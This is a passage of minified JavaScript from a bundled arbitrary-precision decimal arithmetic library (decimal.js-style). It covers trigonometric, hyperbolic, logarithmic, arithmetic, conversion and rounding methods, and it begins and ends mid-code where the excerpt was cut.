                    : ((n = 16), (o = "2.3283064365386962890625e-10")),
                  (t.precision += n),
                  (e = Ik(t, 1, e.times(o), new t(1)));
                for (var i = n; i--; ) {
                  var s = e.times(e);
                  e = s.times(s).minus(s).times(8).plus(1);
                }
                return (t.precision -= n), e;
              })(r, _k(r, n))),
              (r.precision = t),
              (r.rounding = e),
              ck(2 == LA || 3 == LA ? n.neg() : n, t, e, !0))
            : new r(1)
          : new r(NaN);
      }),
    (rk.cubeRoot = rk.cbrt =
      function () {
        var t,
          e,
          n,
          r,
          o,
          i,
          s,
          a,
          u,
          c,
          l = this,
          d = l.constructor;
        if (!l.isFinite() || l.isZero()) return new d(l);
        for (
          KA = !1,
            (i = l.s * ZA(l.s * l, 1 / 3)) && Math.abs(i) != 1 / 0
              ? (r = new d(i.toString()))
              : ((n = ok(l.d)),
                (i = ((t = l.e) - n.length + 1) % 3) &&
                  (n += 1 == i || -2 == i ? "0" : "00"),
                (i = ZA(n, 1 / 3)),
                (t = XA((t + 1) / 3) - (t % 3 == (t < 0 ? -1 : 2))),
                i == 1 / 0
                  ? (n = "5e" + t)
                  : (n =
                      (n = i.toExponential()).slice(0, n.indexOf("e") + 1) + t),
                ((r = new d(n)).s = l.s)),
            s = (t = d.precision) + 3;
          ;

        )
          if (
            ((c = (u = (a = r).times(a).times(a)).plus(l)),
            (r = uk(c.plus(l).times(a), c.plus(u), s + 2, 1)),
            ok(a.d).slice(0, s) === (n = ok(r.d)).slice(0, s))
          ) {
            if ("9999" != (n = n.slice(s - 3, s + 1)) && (o || "4999" != n)) {
              (!+n || (!+n.slice(1) && "5" == n.charAt(0))) &&
                (ck(r, t + 1, 1), (e = !r.times(r).times(r).eq(l)));
              break;
            }
            if (!o && (ck(a, t + 1, 0), a.times(a).times(a).eq(l))) {
              r = a;
              break;
            }
            (s += 4), (o = 1);
          }
        return (KA = !0), ck(r, t, d.rounding, e);
      }),
    (rk.decimalPlaces = rk.dp =
      function () {
        var t,
          e = this.d,
          n = NaN;
        if (e) {
          if (((n = 7 * ((t = e.length - 1) - XA(this.e / 7))), (t = e[t])))
            for (; t % 10 == 0; t /= 10) n--;
          n < 0 && (n = 0);
        }
        return n;
      }),
    (rk.dividedBy = rk.div =
      function (t) {
        return uk(this, new this.constructor(t));
      }),
    (rk.dividedToIntegerBy = rk.divToInt =
      function (t) {
        var e = this.constructor;
        return ck(uk(this, new e(t), 0, 1, 1), e.precision, e.rounding);
      }),
    (rk.equals = rk.eq =
      function (t) {
        return 0 === this.cmp(t);
      }),
    (rk.floor = function () {
      return ck(new this.constructor(this), this.e + 1, 3);
    }),
    (rk.greaterThan = rk.gt =
      function (t) {
        return this.cmp(t) > 0;
      }),
    (rk.greaterThanOrEqualTo = rk.gte =
      function (t) {
        var e = this.cmp(t);
        return 1 == e || 0 === e;
      }),
    (rk.hyperbolicCosine = rk.cosh =
      function () {
        var t,
          e,
          n,
          r,
          o,
          i = this,
          s = i.constructor,
          a = new s(1);
        if (!i.isFinite()) return new s(i.s ? 1 / 0 : NaN);
        if (i.isZero()) return a;
        (n = s.precision),
          (r = s.rounding),
          (s.precision = n + Math.max(i.e, i.sd()) + 4),
          (s.rounding = 1),
          (o = i.d.length) < 32
            ? (e = (1 / Sk(4, (t = Math.ceil(o / 3)))).toString())
            : ((t = 16), (e = "2.3283064365386962890625e-10")),
          (i = Ik(s, 1, i.times(e), new s(1), !0));
        for (var u, c = t, l = new s(8); c--; )
          (u = i.times(i)), (i = a.minus(u.times(l.minus(u.times(l)))));
        return ck(i, (s.precision = n), (s.rounding = r), !0);
      }),
    (rk.hyperbolicSine = rk.sinh =
      function () {
        var t,
          e,
          n,
          r,
          o = this,
          i = o.constructor;
        if (!o.isFinite() || o.isZero()) return new i(o);
        if (
          ((e = i.precision),
          (n = i.rounding),
          (i.precision = e + Math.max(o.e, o.sd()) + 4),
          (i.rounding = 1),
          (r = o.d.length) < 3)
        )
          o = Ik(i, 2, o, o, !0);
        else {
          (t = (t = 1.4 * Math.sqrt(r)) > 16 ? 16 : 0 | t),
            (o = Ik(i, 2, (o = o.times(1 / Sk(5, t))), o, !0));
          for (var s, a = new i(5), u = new i(16), c = new i(20); t--; )
            (s = o.times(o)),
              (o = o.times(a.plus(s.times(u.times(s).plus(c)))));
        }
        return (i.precision = e), (i.rounding = n), ck(o, e, n, !0);
      }),
    (rk.hyperbolicTangent = rk.tanh =
      function () {
        var t,
          e,
          n = this,
          r = n.constructor;
        return n.isFinite()
          ? n.isZero()
            ? new r(n)
            : ((t = r.precision),
              (e = r.rounding),
              (r.precision = t + 7),
              (r.rounding = 1),
              uk(n.sinh(), n.cosh(), (r.precision = t), (r.rounding = e)))
          : new r(n.s);
      }),
    (rk.inverseCosine = rk.acos =
      function () {
        var t,
          e = this,
          n = e.constructor,
          r = e.abs().cmp(1),
          o = n.precision,
          i = n.rounding;
        return -1 !== r
          ? 0 === r
            ? e.isNeg()
              ? hk(n, o, i)
              : new n(0)
            : new n(NaN)
          : e.isZero()
          ? hk(n, o + 4, i).times(0.5)
          : ((n.precision = o + 6),
            (n.rounding = 1),
            (e = e.asin()),
            (t = hk(n, o + 4, i).times(0.5)),
            (n.precision = o),
            (n.rounding = i),
            t.minus(e));
      }),
    (rk.inverseHyperbolicCosine = rk.acosh =
      function () {
        var t,
          e,
          n = this,
          r = n.constructor;
        return n.lte(1)
          ? new r(n.eq(1) ? 0 : NaN)
          : n.isFinite()
          ? ((t = r.precision),
            (e = r.rounding),
            (r.precision = t + Math.max(Math.abs(n.e), n.sd()) + 4),
            (r.rounding = 1),
            (KA = !1),
            (n = n.times(n).minus(1).sqrt().plus(n)),
            (KA = !0),
            (r.precision = t),
            (r.rounding = e),
            n.ln())
          : new r(n);
      }),
    (rk.inverseHyperbolicSine = rk.asinh =
      function () {
        var t,
          e,
          n = this,
          r = n.constructor;
        return !n.isFinite() || n.isZero()
          ? new r(n)
          : ((t = r.precision),
            (e = r.rounding),
            (r.precision = t + 2 * Math.max(Math.abs(n.e), n.sd()) + 6),
            (r.rounding = 1),
            (KA = !1),
            (n = n.times(n).plus(1).sqrt().plus(n)),
            (KA = !0),
            (r.precision = t),
            (r.rounding = e),
            n.ln());
      }),
    (rk.inverseHyperbolicTangent = rk.atanh =
      function () {
        var t,
          e,
          n,
          r,
          o = this,
          i = o.constructor;
        return o.isFinite()
          ? o.e >= 0
            ? new i(o.abs().eq(1) ? o.s / 0 : o.isZero() ? o : NaN)
            : ((t = i.precision),
              (e = i.rounding),
              (r = o.sd()),
              Math.max(r, t) < 2 * -o.e - 1
                ? ck(new i(o), t, e, !0)
                : ((i.precision = n = r - o.e),
                  (o = uk(o.plus(1), new i(1).minus(o), n + t, 1)),
                  (i.precision = t + 4),
                  (i.rounding = 1),
                  (o = o.ln()),
                  (i.precision = t),
                  (i.rounding = e),
                  o.times(0.5)))
          : new i(NaN);
      }),
    (rk.inverseSine = rk.asin =
      function () {
        var t,
          e,
          n,
          r,
          o = this,
          i = o.constructor;
        return o.isZero()
          ? new i(o)
          : ((e = o.abs().cmp(1)),
            (n = i.precision),
            (r = i.rounding),
            -1 !== e
              ? 0 === e
                ? (((t = hk(i, n + 4, r).times(0.5)).s = o.s), t)
                : new i(NaN)
              : ((i.precision = n + 6),
                (i.rounding = 1),
                (o = o.div(new i(1).minus(o.times(o)).sqrt().plus(1)).atan()),
                (i.precision = n),
                (i.rounding = r),
                o.times(2)));
      }),
    (rk.inverseTangent = rk.atan =
      function () {
        var t,
          e,
          n,
          r,
          o,
          i,
          s,
          a,
          u,
          c = this,
          l = c.constructor,
          d = l.precision,
          f = l.rounding;
        if (c.isFinite()) {
          if (c.isZero()) return new l(c);
          if (c.abs().eq(1) && d + 4 <= nk)
            return ((s = hk(l, d + 4, f).times(0.25)).s = c.s), s;
        } else {
          if (!c.s) return new l(NaN);
          if (d + 4 <= nk) return ((s = hk(l, d + 4, f).times(0.5)).s = c.s), s;
        }
        for (
          l.precision = a = d + 10,
            l.rounding = 1,
            t = n = Math.min(28, (a / 7 + 2) | 0);
          t;
          --t
        )
          c = c.div(c.times(c).plus(1).sqrt().plus(1));
        for (
          KA = !1,
            e = Math.ceil(a / 7),
            r = 1,
            u = c.times(c),
            s = new l(c),
            o = c;
          -1 !== t;

        )
          if (
            ((o = o.times(u)),
            (i = s.minus(o.div((r += 2)))),
            (o = o.times(u)),
            void 0 !== (s = i.plus(o.div((r += 2)))).d[e])
          )
            for (t = e; s.d[t] === i.d[t] && t--; );
        return (
          n && (s = s.times(2 << (n - 1))),
          (KA = !0),
          ck(s, (l.precision = d), (l.rounding = f), !0)
        );
      }),
    (rk.isFinite = function () {
      return !!this.d;
    }),
    (rk.isInteger = rk.isInt =
      function () {
        return !!this.d && XA(this.e / 7) > this.d.length - 2;
      }),
    (rk.isNaN = function () {
      return !this.s;
    }),
    (rk.isNegative = rk.isNeg =
      function () {
        return this.s < 0;
      }),
    (rk.isPositive = rk.isPos =
      function () {
        return this.s > 0;
      }),
    (rk.isZero = function () {
      return !!this.d && 0 === this.d[0];
    }),
    (rk.lessThan = rk.lt =
      function (t) {
        return this.cmp(t) < 0;
      }),
    (rk.lessThanOrEqualTo = rk.lte =
      function (t) {
        return this.cmp(t) < 1;
      }),
    (rk.logarithm = rk.log =
      function (t) {
        var e,
          n,
          r,
          o,
          i,
          s,
          a,
          u,
          c = this,
          l = c.constructor,
          d = l.precision,
          f = l.rounding;
        if (null == t) (t = new l(10)), (e = !0);
        else {
          if (((n = (t = new l(t)).d), t.s < 0 || !n || !n[0] || t.eq(1)))
            return new l(NaN);
          e = t.eq(10);
        }
        if (((n = c.d), c.s < 0 || !n || !n[0] || c.eq(1)))
          return new l(n && !n[0] ? -1 / 0 : 1 != c.s ? NaN : n ? 0 : 1 / 0);
        if (e)
          if (n.length > 1) i = !0;
          else {
            for (o = n[0]; o % 10 == 0; ) o /= 10;
            i = 1 !== o;
          }
        if (
          ((KA = !1),
          (s = vk(c, (a = d + 5))),
          (r = e ? fk(l, a + 10) : vk(t, a)),
          sk((u = uk(s, r, a, 1)).d, (o = d), f))
        )
          do {
            if (
              ((s = vk(c, (a += 10))),
              (r = e ? fk(l, a + 10) : vk(t, a)),
              (u = uk(s, r, a, 1)),
              !i)
            ) {
              +ok(u.d).slice(o + 1, o + 15) + 1 == 1e14 &&
                (u = ck(u, d + 1, 0));
              break;
            }
          } while (sk(u.d, (o += 10), f));
        return (KA = !0), ck(u, d, f);
      }),
    (rk.minus = rk.sub =
      function (t) {
        var e,
          n,
          r,
          o,
          i,
          s,
          a,
          u,
          c,
          l,
          d,
          f,
          h = this,
          p = h.constructor;
        if (((t = new p(t)), !h.d || !t.d))
          return (
            h.s && t.s
              ? h.d
                ? (t.s = -t.s)
                : (t = new p(t.d || h.s !== t.s ? h : NaN))
              : (t = new p(NaN)),
            t
          );
        if (h.s != t.s) return (t.s = -t.s), h.plus(t);
        if (
          ((c = h.d),
          (f = t.d),
          (a = p.precision),
          (u = p.rounding),
          !c[0] || !f[0])
        ) {
          if (f[0]) t.s = -t.s;
          else {
            if (!c[0]) return new p(3 === u ? -0 : 0);
            t = new p(h);
          }
          return KA ? ck(t, a, u) : t;
        }
        if (
          ((n = XA(t.e / 7)), (l = XA(h.e / 7)), (c = c.slice()), (i = l - n))
        ) {
          for (
            (d = i < 0)
              ? ((e = c), (i = -i), (s = f.length))
              : ((e = f), (n = l), (s = c.length)),
              i > (r = Math.max(Math.ceil(a / 7), s) + 2) &&
                ((i = r), (e.length = 1)),
              e.reverse(),
              r = i;
            r--;

          )
            e.push(0);
          e.reverse();
        } else {
          for (
            (d = (r = c.length) < (s = f.length)) && (s = r), r = 0;
            r < s;
            r++
          )
            if (c[r] != f[r]) {
              d = c[r] < f[r];
              break;
            }
          i = 0;
        }
        for (
          d && ((e = c), (c = f), (f = e), (t.s = -t.s)),
            s = c.length,
            r = f.length - s;
          r > 0;
          --r
        )
          c[s++] = 0;
        for (r = f.length; r > i; ) {
          if (c[--r] < f[r]) {
            for (o = r; o && 0 === c[--o]; ) c[o] = tk - 1;
            --c[o], (c[r] += tk);
          }
          c[r] -= f[r];
        }
        for (; 0 === c[--s]; ) c.pop();
        for (; 0 === c[0]; c.shift()) --n;
        return c[0]
          ? ((t.d = c), (t.e = dk(c, n)), KA ? ck(t, a, u) : t)
          : new p(3 === u ? -0 : 0);
      }),
    (rk.modulo = rk.mod =
      function (t) {
        var e,
          n = this,
          r = n.constructor;
        return (
          (t = new r(t)),
          !n.d || !t.s || (t.d && !t.d[0])
            ? new r(NaN)
            : !t.d || (n.d && !n.d[0])
            ? ck(new r(n), r.precision, r.rounding)
            : ((KA = !1),
              9 == r.modulo
                ? ((e = uk(n, t.abs(), 0, 3, 1)).s *= t.s)
                : (e = uk(n, t, 0, r.modulo, 1)),
              (e = e.times(t)),
              (KA = !0),
              n.minus(e))
        );
      }),
    (rk.naturalExponential = rk.exp =
      function () {
        return bk(this);
      }),
    (rk.naturalLogarithm = rk.ln =
      function () {
        return vk(this);
      }),
    (rk.negated = rk.neg =
      function () {
        var t = new this.constructor(this);
        return (t.s = -t.s), ck(t);
      }),
    (rk.plus = rk.add =
      function (t) {
        var e,
          n,
          r,
          o,
          i,
          s,
          a,
          u,
          c,
          l,
          d = this,
          f = d.constructor;
        if (((t = new f(t)), !d.d || !t.d))
          return (
            d.s && t.s
              ? d.d || (t = new f(t.d || d.s === t.s ? d : NaN))
              : (t = new f(NaN)),
            t
          );
        if (d.s != t.s) return (t.s = -t.s), d.minus(t);
        if (
          ((c = d.d),
          (l = t.d),
          (a = f.precision),
          (u = f.rounding),
          !c[0] || !l[0])
        )
          return l[0] || (t = new f(d)), KA ? ck(t, a, u) : t;
        if (
          ((i = XA(d.e / 7)), (r = XA(t.e / 7)), (c = c.slice()), (o = i - r))
        ) {
          for (
            o < 0
              ? ((n = c), (o = -o), (s = l.length))
              : ((n = l), (r = i), (s = c.length)),
              o > (s = (i = Math.ceil(a / 7)) > s ? i + 1 : s + 1) &&
                ((o = s), (n.length = 1)),
              n.reverse();
            o--;

          )
            n.push(0);
          n.reverse();
        }
        for (
          (s = c.length) - (o = l.length) < 0 &&
            ((o = s), (n = l), (l = c), (c = n)),
            e = 0;
          o;

        )
          (e = ((c[--o] = c[o] + l[o] + e) / tk) | 0), (c[o] %= tk);
        for (e && (c.unshift(e), ++r), s = c.length; 0 == c[--s]; ) c.pop();
        return (t.d = c), (t.e = dk(c, r)), KA ? ck(t, a, u) : t;
      }),
    (rk.precision = rk.sd =
      function (t) {
        var e,
          n = this;
        if (void 0 !== t && t !== !!t && 1 !== t && 0 !== t)
          throw Error(jA + t);
        return (
          n.d ? ((e = pk(n.d)), t && n.e + 1 > e && (e = n.e + 1)) : (e = NaN),
          e
        );
      }),
    (rk.round = function () {
      var t = this,
        e = t.constructor;
      return ck(new e(t), t.e + 1, e.rounding);
    }),
    (rk.sine = rk.sin =
      function () {
        var t,
          e,
          n = this,
          r = n.constructor;
        return n.isFinite()
          ? n.isZero()
            ? new r(n)
            : ((t = r.precision),
              (e = r.rounding),
              (r.precision = t + Math.max(n.e, n.sd()) + 7),
              (r.rounding = 1),
              (n = (function (t, e) {
                var n,
                  r = e.d.length;
                if (r < 3) return e.isZero() ? e : Ik(t, 2, e, e);
                (n = 1.4 * Math.sqrt(r)),
                  (n = n > 16 ? 16 : 0 | n),
                  (e = e.times(1 / Sk(5, n))),
                  (e = Ik(t, 2, e, e));
                for (var o, i = new t(5), s = new t(16), a = new t(20); n--; )
                  (o = e.times(e)),
                    (e = e.times(i.plus(o.times(s.times(o).minus(a)))));
                return e;
              })(r, _k(r, n))),
              (r.precision = t),
              (r.rounding = e),
              ck(LA > 2 ? n.neg() : n, t, e, !0))
          : new r(NaN);
      }),
    (rk.squareRoot = rk.sqrt =
      function () {
        var t,
          e,
          n,
          r,
          o,
          i,
          s = this,
          a = s.d,
          u = s.e,
          c = s.s,
          l = s.constructor;
        if (1 !== c || !a || !a[0])
          return new l(!c || (c < 0 && (!a || a[0])) ? NaN : a ? s : 1 / 0);
        for (
          KA = !1,
            0 == (c = Math.sqrt(+s)) || c == 1 / 0
              ? (((e = ok(a)).length + u) % 2 == 0 && (e += "0"),
                (c = Math.sqrt(e)),
                (u = XA((u + 1) / 2) - (u < 0 || u % 2)),
                c == 1 / 0
                  ? (e = "5e" + u)
                  : (e =
                      (e = c.toExponential()).slice(0, e.indexOf("e") + 1) + u),
                (r = new l(e)))
              : (r = new l(c.toString())),
            n = (u = l.precision) + 3;
          ;

        )
          if (
            ((r = (i = r).plus(uk(s, i, n + 2, 1)).times(0.5)),
            ok(i.d).slice(0, n) === (e = ok(r.d)).slice(0, n))
          ) {
            if ("9999" != (e = e.slice(n - 3, n + 1)) && (o || "4999" != e)) {
              (!+e || (!+e.slice(1) && "5" == e.charAt(0))) &&
                (ck(r, u + 1, 1), (t = !r.times(r).eq(s)));
              break;
            }
            if (!o && (ck(i, u + 1, 0), i.times(i).eq(s))) {
              r = i;
              break;
            }
            (n += 4), (o = 1);
          }
        return (KA = !0), ck(r, u, l.rounding, t);
      }),
    (rk.tangent = rk.tan =
      function () {
        var t,
          e,
          n = this,
          r = n.constructor;
        return n.isFinite()
          ? n.isZero()
            ? new r(n)
            : ((t = r.precision),
              (e = r.rounding),
              (r.precision = t + 10),
              (r.rounding = 1),
              ((n = n.sin()).s = 1),
              (n = uk(n, new r(1).minus(n.times(n)).sqrt(), t + 10, 0)),
              (r.precision = t),
              (r.rounding = e),
              ck(2 == LA || 4 == LA ? n.neg() : n, t, e, !0))
          : new r(NaN);
      }),
    (rk.times = rk.mul =
      function (t) {
        var e,
          n,
          r,
          o,
          i,
          s,
          a,
          u,
          c,
          l = this,
          d = l.constructor,
          f = l.d,
          h = (t = new d(t)).d;
        if (((t.s *= l.s), !(f && f[0] && h && h[0])))
          return new d(
            !t.s || (f && !f[0] && !h) || (h && !h[0] && !f)
              ? NaN
              : f && h
              ? 0 * t.s
              : t.s / 0
          );
        for (
          n = XA(l.e / 7) + XA(t.e / 7),
            (u = f.length) < (c = h.length) &&
              ((i = f), (f = h), (h = i), (s = u), (u = c), (c = s)),
            i = [],
            r = s = u + c;
          r--;

        )
          i.push(0);
        for (r = c; --r >= 0; ) {
          for (e = 0, o = u + r; o > r; )
            (a = i[o] + h[r] * f[o - r - 1] + e),
              (i[o--] = a % tk | 0),
              (e = (a / tk) | 0);
          i[o] = (i[o] + e) % tk | 0;
        }
        for (; !i[--s]; ) i.pop();
        return (
          e ? ++n : i.shift(),
          (t.d = i),
          (t.e = dk(i, n)),
          KA ? ck(t, d.precision, d.rounding) : t
        );
      }),
    (rk.toBinary = function (t, e) {
      return Tk(this, 2, t, e);
    }),
    (rk.toDecimalPlaces = rk.toDP =
      function (t, e) {
        var n = this,
          r = n.constructor;
        return (
          (n = new r(n)),
          void 0 === t
            ? n
            : (ik(t, 0, DA),
              void 0 === e ? (e = r.rounding) : ik(e, 0, 8),
              ck(n, t + n.e + 1, e))
        );
      }),
    (rk.toExponential = function (t, e) {
      var n,
        r = this,
        o = r.constructor;
      return (
        void 0 === t
          ? (n = lk(r, !0))
          : (ik(t, 0, DA),
            void 0 === e ? (e = o.rounding) : ik(e, 0, 8),
            (n = lk((r = ck(new o(r), t + 1, e)), !0, t + 1))),
        r.isNeg() && !r.isZero() ? "-" + n : n
      );
    }),
    (rk.toFixed = function (t, e) {
      var n,
        r,
        o = this,
        i = o.constructor;
      return (
        void 0 === t
          ? (n = lk(o))
          : (ik(t, 0, DA),
            void 0 === e ? (e = i.rounding) : ik(e, 0, 8),
            (n = lk((r = ck(new i(o), t + o.e + 1, e)), !1, t + r.e + 1))),
        o.isNeg() && !o.isZero() ? "-" + n : n
      );
    }),
    (rk.toFraction = function (t) {
      var e,
        n,
        r,
        o,
        i,
        s,
        a,
        u,
        c,
        l,
        d,
        f,
        h = this,
        p = h.d,
        m = h.constructor;
      if (!p) return new m(h);
      if (
        ((c = n = new m(1)),
        (r = u = new m(0)),
        (s = (i = (e = new m(r)).e = pk(p) - h.e - 1) % 7),
        (e.d[0] = ZA(10, s < 0 ? 7 + s : s)),
        null == t)
      )
        t = i > 0 ? e : c;
      else {
        if (!(a = new m(t)).isInt() || a.lt(c)) throw Error(jA + a);
        t = a.gt(e) ? (i > 0 ? e : c) : a;
      }
      for (
        KA = !1,
          a = new m(ok(p)),
          l = m.precision,
          m.precision = i = 7 * p.length * 2;
        (d = uk(a, e, 0, 1, 1)), 1 != (o = n.plus(d.times(r))).cmp(t);

      )
        (n = r),
          (r = o),
          (o = c),
          (c = u.plus(d.times(o))),
          (u = o),
          (o = e),
          (e = a.minus(d.times(o))),
          (a = o);
      return (
        (o = uk(t.minus(n), r, 0, 1, 1)),
        (u = u.plus(o.times(c))),
        (n = n.plus(o.times(r))),
        (u.s = c.s = h.s),
        (f =
          uk(c, r, i, 1).minus(h).abs().cmp(uk(u, n, i, 1).minus(h).abs()) < 1
            ? [c, r]
            : [u, n]),
        (m.precision = l),
        (KA = !0),
        f
      );
    }),
    (rk.toHexadecimal = rk.toHex =
      function (t, e) {
        return Tk(this, 16, t, e);
      }),
    (rk.toNearest = function (t, e) {
      var n = this,
        r = n.constructor;
      if (((n = new r(n)), null == t)) {
        if (!n.d) return n;
        (t = new r(1)), (e = r.rounding);
      } else {
        if (
          ((t = new r(t)), void 0 === e ? (e = r.rounding) : ik(e, 0, 8), !n.d)
        )
          return t.s ? n : t;
        if (!t.d) return t.s && (t.s = n.s), t;
      }
      return (
        t.d[0]
          ? ((KA = !1), (n = uk(n, t, 0, e, 1).times(t)), (KA = !0), ck(n))
          : ((t.s = n.s), (n = t)),
        n
      );
    }),
    (rk.toNumber = function () {
      return +this;
    }),
    (rk.toOctal = function (t, e) {
      return Tk(this, 8, t, e);
    }),
    (rk.toPower = rk.pow =
      function (t) {
        var e,
          n,
          r,
          o,
          i,
          s,
          a = this,
          u = a.constructor,
          c = +(t = new u(t));
        if (!(a.d && t.d && a.d[0] && t.d[0])) return new u(ZA(+a, c));
        if ((a = new u(a)).eq(1)) return a;
        if (((r = u.precision), (i = u.rounding), t.eq(1))) return ck(a, r, i);
        if (
          (e = XA(t.e / 7)) >= t.d.length - 1 &&
          (n = c < 0 ? -c : c) <= 9007199254740991
        )
          return (o = gk(u, a, n, r)), t.s < 0 ? new u(1).div(o) : ck(o, r, i);
        if ((s = a.s) < 0) {
          if (e < t.d.length - 1) return new u(NaN);
          if (
            (!(1 & t.d[e]) && (s = 1),
            0 == a.e && 1 == a.d[0] && 1 == a.d.length)
          )
            return (a.s = s), a;
        }
        return (e =
          0 != (n = ZA(+a, c)) && isFinite(n)
            ? new u(n + "").e
            : XA(c * (Math.log("0." + ok(a.d)) / Math.LN10 + a.e + 1))) >
          u.maxE + 1 || e < u.minE - 1
          ? new u(e > 0 ? s / 0 : 0)
          : ((KA = !1),
            (u.rounding = a.s = 1),
            (n = Math.min(12, (e + "").length)),
            (o = bk(t.times(vk(a, r + n)), r)).d &&
              sk((o = ck(o, r + 5, 1)).d, r, i) &&
              ((e = r + 10),
              +ok((o = ck(bk(t.times(vk(a, e + n)), e), e + 5, 1)).d).slice(
                r + 1,
                r + 15
              ) +
                1 ==
                1e14 && (o = ck(o, r + 1, 0))),
            (o.s = s),
            (KA = !0),
            (u.rounding = i),
            ck(o, r, i));
      }),
    (rk.toPrecision = function (t, e) {
      var n,
        r = this,
        o = r.constructor;
      return (
        void 0 === t
          ? (n = lk(r, r.e <= o.toExpNeg || r.e >= o.toExpPos))
          : (ik(t, 1, DA),
            void 0 === e ? (e = o.rounding) : ik(e, 0, 8),
            (n = lk(
              (r = ck(new o(r), t, e)),
              t <= r.e || r.e <= o.toExpNeg,
              t
            ))),
        r.isNeg() && !r.isZero() ? "-" + n : n
      );
    }),
    (rk.toSignificantDigits = rk.toSD =
      function (t, e) {
        var n = this.constructor;
        return (
          void 0 === t
            ? ((t = n.precision), (e = n.rounding))
            : (ik(t, 1, DA), void 0 === e ? (e = n.rounding) : ik(e, 0, 8)),
          ck(new n(this), t, e)
        );
      }),
    (rk.toString = function () {
      var t = this,
        e = t.constructor,
        n = lk(t, t.e <= e.toExpNeg || t.e >= e.toExpPos);
      return t.isNeg() && !t.isZero() ? "-" + n : n;
    }),
    (rk.truncated = rk.trunc =
      function () {
        return ck(new this.constructor(this), this.e + 1, 1);
      }),
    (rk.valueOf = rk.toJSON =
      function () {
        var t = this,
          e = t.constructor,
          n = lk(t, t.e <= e.toExpNeg || t.e >= e.toExpPos);
        return t.isNeg() ? "-" + n : n;
      });
  var uk = (function () {
    function t(t, e, n) {
      var r,
        o = 0,
        i = t.length;
      for (t = t.slice(); i--; )
        (r = t[i] * e + o), (t[i] = r % n | 0), (o = (r / n) | 0);
      return o && t.unshift(o), t;
    }
    function e(t, e, n, r) {
      var o, i;
      if (n != r) i = n > r ? 1 : -1;
      else
        for (o = i = 0; o < n; o++)
          if (t[o] != e[o]) {
            i = t[o] > e[o] ? 1 : -1;
            break;
          }
      return i;
    }
    function n(t, e, n, r) {
      for (var o = 0; n--; )
        (t[n] -= o), (o = t[n] < e[n] ? 1 : 0), (t[n] = o * r + t[n] - e[n]);
      for (; !t[0] && t.length > 1; ) t.shift();
    }
    return function (r, o, i, s, a, u) {
      var c,
        l,
        d,
        f,
        h,
        p,
        m,
        g,
        y,
        w,
        b,
        v,
        A,
        k,
        I,
        S,
        _,
        T,
        C,
        B,
        E = r.constructor,
        x = r.s == o.s ? 1 : -1,
        P = r.d,
        R = o.d;
      if (!(P && P[0] && R && R[0]))
        return new E(
          r.s && o.s && (P ? !R || P[0] != R[0] : R)
            ? (P && 0 == P[0]) || !R
              ? 0 * x
              : x / 0
            : NaN
        );
      for (
        u
          ? ((h = 1), (l = r.e - o.e))
          : ((u = tk), (h = 7), (l = XA(r.e / h) - XA(o.e / h))),
          C = R.length,
          _ = P.length,
          w = (y = new E(x)).d = [],
          d = 0;
        R[d] == (P[d] || 0);
        d++
      );
      if (
        (R[d] > (P[d] || 0) && l--,
        null == i
          ? ((k = i = E.precision), (s = E.rounding))
          : (k = a ? i + (r.e - o.e) + 1 : i),
        k < 0)
      )
        w.push(1), (p = !0);
      else {
        if (((k = (k / h + 2) | 0), (d = 0), 1 == C)) {
          for (f = 0, R = R[0], k++; (d < _ || f) && k--; d++)
            (I = f * u + (P[d] || 0)), (w[d] = (I / R) | 0), (f = I % R | 0);
          p = f || d < _;
        } else {
          for (
            (f = (u / (R[0] + 1)) | 0) > 1 &&
              ((R = t(R, f, u)),
              (P = t(P, f, u)),
              (C = R.length),
              (_ = P.length)),
              S = C,
              v = (b = P.slice(0, C)).length;
            v < C;

          )
            b[v++] = 0;
          (B = R.slice()).unshift(0), (T = R[0]), R[1] >= u / 2 && ++T;
          do {
            (f = 0),
              (c = e(R, b, C, v)) < 0
                ? ((A = b[0]),
                  C != v && (A = A * u + (b[1] || 0)),
                  (f = (A / T) | 0) > 1
                    ? (f >= u && (f = u - 1),
                      1 ==
                        (c = e(
                          (m = t(R, f, u)),
                          b,
                          (g = m.length),
                          (v = b.length)
                        )) && (f--, n(m, C < g ? B : R, g, u)))
                    : (0 == f && (c = f = 1), (m = R.slice())),
                  (g = m.length) < v && m.unshift(0),
                  n(b, m, v, u),
                  -1 == c &&
                    (c = e(R, b, C, (v = b.length))) < 1 &&
                    (f++, n(b, C < v ? B : R, v, u)),
                  (v = b.length))
                : 0 === c && (f++, (b = [0])),
              (w[d++] = f),
              c && b[0] ? (b[v++] = P[S] || 0) : ((b = [P[S]]), (v = 1));
          } while ((S++ < _ || void 0 !== b[0]) && k--);
          p = void 0 !== b[0];
        }
        w[0] || w.shift();
      }
      if (1 == h) (y.e = l), (MA = p);
      else {
        for (d = 1, f = w[0]; f >= 10; f /= 10) d++;
        (y.e = d + l * h - 1), ck(y, a ? i + y.e + 1 : i, s, p);
      }
      return y;
    };
  })();
  function ck(t, e, n, r) {
    var o,
      i,
      s,
      a,
      u,
      c,
      l,
      d,
      f,
      h = t.constructor;
    t: if (null != e) {
      if (!(d = t.d)) return t;
      for (o = 1, a = d[0]; a >= 10; a /= 10) o++;
      if ((i = e - o) < 0)
        (i += 7),
          (s = e),
          (u = ((l = d[(f = 0)]) / ZA(10, o - s - 1)) % 10 | 0);
      else if ((f = Math.ceil((i + 1) / 7)) >= (a = d.length)) {
        if (!r) break t;
        for (; a++ <= f; ) d.push(0);
        (l = u = 0), (o = 1), (s = (i %= 7) - 7 + 1);
      } else {
        for (l = a = d[f], o = 1; a >= 10; a /= 10) o++;
        u = (s = (i %= 7) - 7 + o) < 0 ? 0 : (l / ZA(10, o - s - 1)) % 10 | 0;
      }
      if (
        ((r =
          r ||
          e < 0 ||
          void 0 !== d[f + 1] ||
          (s < 0 ? l : l % ZA(10, o - s - 1))),
        (c =
          n < 4
            ? (u || r) && (0 == n || n == (t.s < 0 ? 3 : 2))
            : u > 5 ||
              (5 == u &&
                (4 == n ||
                  r ||
                  (6 == n &&
                    (i > 0 ? (s > 0 ? l / ZA(10, o - s) : 0) : d[f - 1]) % 10 &
                      1) ||
                  n == (t.s < 0 ? 8 : 7)))),
        e < 1 || !d[0])
      )
        return (
          (d.length = 0),
          c
            ? ((e -= t.e + 1),
              (d[0] = ZA(10, (7 - (e % 7)) % 7)),
              (t.e = -e || 0))
            : (d[0] = t.e = 0),
          t
        );
      if (
        (0 == i
          ? ((d.length = f), (a = 1), f--)
          : ((d.length = f + 1),
            (a = ZA(10, 7 - i)),
            (d[f] = s > 0 ? ((l / ZA(10, o - s)) % ZA(10, s) | 0) * a : 0)),
        c)
      )
        for (;;) {
          if (0 == f) {
